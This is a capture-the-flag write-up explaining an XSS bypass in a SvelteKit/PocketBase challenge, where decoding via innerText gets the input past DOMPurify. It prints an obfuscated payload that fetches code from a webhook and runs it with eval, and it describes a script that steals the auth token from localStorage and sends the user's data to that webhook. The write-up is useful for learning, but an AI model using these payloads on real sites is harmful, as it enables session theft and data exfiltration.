# justPocketTheBase

The vulnerability is onMount function in `app/src/routes/view-plant/+page.svelte`.

Calling `.innerText;` on an html element will convert all html object to strings, which results in `&gt;` and `&lt;` being converted to `>` and `<` respectively. This gives an ability to inject our XSS that DOMPurify will not catch, as `&gt;` and `&lt;` are going through it, and not the actual `>` and `<` characters. *(Of course the blacklist is easily bypassable as shown below.)*

Edit appropriate variables at the top of the `pwn.py` file, and run the solver.

Set the [webhook](webhook.site) return body to contents of `pwn.js` and `Content-Type` to `application/javascript`.
The script does the following:
1. Get the token from localStorage of pocketbase auth
2. Get all own records
3. Fetch the image of the first record
4. Send the image to the webhook

To run the solver: `python3 pwn.py`
This solver does the following:
1. Creates an XSS payload that will evaluate whatever your webhook returns:
```python
p = f"fetch('{webhook}').then(aa=>aa.text().then(t=>eval(t)))"
p = base64.b64encode(p.encode()).decode().replace("\n", "")
js_code = 'eval.call`${eval.call`${`atob\`' + p +'\``}`}`'
p = f"&lt;img src=x onerror={js_code}&gt;"
```
1. Create a user with random credentials
2. Authenticate to get the JWT token
3. Create a new plant post with the XSS payload as the title
4. Call report bot with the plant post ID

This should send 2 requests to your webhook. First a GET call for the script, and then a POST call with the flag image. Now run `exiftool <img>` and you should be able to see the flag under the `Artist` field.